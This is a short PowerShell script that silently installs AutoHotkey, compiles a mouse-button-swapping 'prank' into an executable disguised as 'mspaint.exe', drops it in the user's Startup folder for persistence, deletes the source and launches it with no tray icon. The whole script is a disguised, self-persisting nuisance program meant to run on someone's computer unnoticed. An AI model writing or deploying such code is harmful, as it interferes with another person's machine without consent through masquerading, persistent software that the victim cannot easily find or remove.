# Install AutoHotkey silently
winget install AutoHotkey.AutoHotkey `
  --silent `
  --accept-package-agreements `
  --accept-source-agreements

$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

$ahkPath = Join-Path $startup "mouse_prank.ahk"
$exePath = Join-Path $startup "mspaint.exe"

$compiler = "C:\Program Files\AutoHotkey\Compiler\Ahk2Exe.exe"

# Create the AHK file
@'
#Requires AutoHotkey v2.0
#NoTrayIcon

~LButton::DllCall("user32.dll\SwapMouseButton", "Int", 1)
~RButton::DllCall("user32.dll\SwapMouseButton", "Int", 0)

Esc::{
    DllCall("user32.dll\SwapMouseButton", "Int", 0)
    ExitApp()
}
'@ | Set-Content -Path $ahkPath -Encoding UTF8

# Compile to EXE
& "$compiler" `
  /in "$ahkPath" `
  /out "$exePath"

# Remove source AHK
Remove-Item $ahkPath -Force

# Launch compiled prank
Start-Process $exePath
